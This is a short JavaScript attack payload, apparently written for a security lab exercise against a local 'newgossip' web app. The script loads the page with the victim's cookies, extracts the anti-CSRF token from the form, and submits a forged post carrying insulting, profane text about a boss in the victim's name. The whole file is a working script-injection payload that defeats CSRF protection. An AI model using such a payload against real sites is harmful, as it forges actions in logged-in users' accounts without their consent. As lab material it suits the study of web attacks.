var domain = "http://localhost:10007/newgossip"
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);			// false -> Syn (waits for response), true -> Asyn (doesn't wait for response)
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName('_csrf_token')[0].value;

var req2 = new XMLHttpRequest();
var title_txt = 'MY%20BOSS%20IN%20AN%20IDIOT';
var subtitle_txt = 'BOSS%20YOU%20ARE%20AN%20ASSHOLE';
var text_txt = 'My%20boss%20has%20not%20paid%20me%20two%20months%20ago%20and%20he%20is%20an%20asshole%20with%20me';
var post_data = 'title=' + title_txt + '&subtitle=' + subtitle_txt + '&text=' + text_txt + '&_csrf_token=' + token;
req2.open('POST', domain, false);			// false -> Syn (waits for response), true -> Asyn (doesn't wait for response)
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(post_data);
